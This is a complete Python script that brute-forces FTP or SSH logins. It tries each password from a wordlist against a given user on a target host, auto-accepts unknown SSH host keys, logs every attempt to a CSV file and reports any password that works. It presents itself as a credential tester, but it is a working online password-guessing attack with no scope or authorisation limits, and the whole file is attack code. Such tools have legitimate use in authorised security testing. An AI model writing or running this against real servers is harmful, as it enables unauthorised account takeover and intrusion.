#!/usr/bin/env python3

import argparse
import csv
import ftplib
import socket
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

import paramiko


def _local_ip(target: str, port: int) -> str:
    """Return the local source IP used to reach target:port.

    Uses a UDP socket — no packet is actually sent.
    Falls back to 'unknown' if the host is unreachable.
    """
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect((target, port))
            return s.getsockname()[0]
    except OSError:
        return "unknown"


# adding shortcuts -p or --ports
def parse_arguments():
    """Define and parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description="Test credentials against FTP or SSH services"
    )
    parser.add_argument("target", help="Target IP address or hostname")
    parser.add_argument(
        "--service",
        choices=["ftp", "ssh"],
        required=True,
        help="Service to test: ftp or ssh",
    )
    parser.add_argument("--user", required=True, help="Username to test")
    parser.add_argument(
        "--wordlist",
        required=True,
        type=Path,
        help="Path to the password wordlist file",
    )
    parser.add_argument(
        "--port",
        type=int,
        default=None,
        help="Target port (default: 21 for FTP, 22 for SSH)",
    )
    parser.add_argument(
        "--output",
        type=Path,
        default=Path("attempts.csv"),
        help="Write attempt log to this CSV file (default: attempts.csv)",
    )
    return parser.parse_args()


def load_wordlist(path: Path) -> list[str]:
    """Load and clean a password wordlist from a file.

    Skips empty lines and strips whitespace. Uses errors='ignore'
    to handle non-UTF-8 bytes without crashing.

    Args:
        path: Path to the wordlist file.

    Returns:
        A list of non-empty password strings.

    Raises:
        SystemExit: If the file does not exist.
    """
    if not path.exists():
        print(f"[!] ERROR: Wordlist not found: {path}", file=sys.stderr)
        sys.exit(1)

    with path.open("r", encoding="utf-8", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]

    print(f"[*] Loaded {len(passwords)} passwords from {path}")
    return passwords


def attempt_ftp(host: str, port: int, user: str, password: str) -> bool:
    """Attempt FTP login with the given credentials.

    Returns True ONLY if the server confirms authentication success.
    Returns False for authentication failure AND for connection errors.

    Args:
        host: Target IP or hostname.
        port: FTP port number.
        user: Username to test.
        password: Password candidate.

    Returns:
        True if login succeeded, False otherwise.
    """
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port, timeout=5)
        ftp.login(user, password)
        ftp.quit()
        return True
    except ftplib.error_perm:
        return False
    except (ConnectionRefusedError, TimeoutError, OSError) as e:
        print(f"[!] Connection error: {e}", file=sys.stderr)
        return False


def attempt_ssh(host: str, port: int, user: str, password: str) -> bool:
    """Attempt SSH login with the given credentials.

    Returns True ONLY if password authentication succeeded.
    Returns False for authentication failure AND connection errors.

    Args:
        host: Target IP or hostname.
        port: SSH port number.
        user: Username to test.
        password: Password candidate.

    Returns:
        True if login succeeded, False otherwise.
    """
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            host,
            port=port,
            username=user,
            password=password,
            allow_agent=False,
            look_for_keys=False,
            timeout=5,
        )
        return True
    except paramiko.AuthenticationException:
        return False
    except (paramiko.SSHException, socket.error, OSError) as e:
        print(f"[!] SSH connection error: {e}", file=sys.stderr)
        return False
    finally:
        client.close()


def run_credential_test(host, port, user, passwords, attempt_fn, output_path=None):
    total = len(passwords)
    source = _local_ip(host, port)

    csv_file = None
    writer = None
    if output_path is not None:
        write_header = not output_path.exists() or output_path.stat().st_size == 0
        csv_file = output_path.open("a", newline="", encoding="utf-8")
        writer = csv.DictWriter(
            csv_file,
            fieldnames=["timestamp", "user", "password", "result", "source"],
        )
        if write_header:
            writer.writeheader()

    try:
        for i, password in enumerate(passwords, start=1):
            print(f"[*] Attempt {i}/{total}: {user}:{password}")

            success = attempt_fn(host, port, user, password)
            result = "SUCCESS" if success else "FAIL"

            if writer:
                writer.writerow(
                    {
                        "timestamp": datetime.now(timezone.utc).strftime(
                            "%Y-%m-%dT%H:%M:%S"
                        ),
                        "user": user,
                        "password": password,
                        "result": result,
                        "source": source,
                    }
                )
                csv_file.flush()

            if success:
                return password

            time.sleep(0.1)
    finally:
        if csv_file:
            csv_file.close()

    return None


def main():
    """Main orchestration: parse args, load wordlist, run test, report."""
    args = parse_arguments()

    # Resolve default port based on service
    if args.port is None:
        args.port = 21 if args.service == "ftp" else 22

    # Load and validate wordlist
    passwords = load_wordlist(args.wordlist)

    if not passwords:
        print("[!] Wordlist is empty after cleaning.", file=sys.stderr)
        sys.exit(1)

    # Select the attempt function based on service
    if args.service == "ftp":
        attempt_fn = attempt_ftp
    elif args.service == "ssh":
        attempt_fn = attempt_ssh

    # Run the credential test
    print(f"[*] Target:   {args.target}:{args.port}")
    print(f"[*] Service:  {args.service}")
    print(f"[*] User:     {args.user}")
    print(f"[*] Wordlist: {len(passwords)} entries")
    print(f"[*] Output:   {args.output}")
    print()

    result = run_credential_test(
        args.target, args.port, args.user, passwords, attempt_fn, args.output
    )

    if result:
        print(f"\n[*] FOUND: {args.user}:{result}")
    else:
        print(
            f"\n[-] EXHAUSTED: Wordlist complete — no valid credentials for {args.user}"
        )


if __name__ == "__main__":
    main()
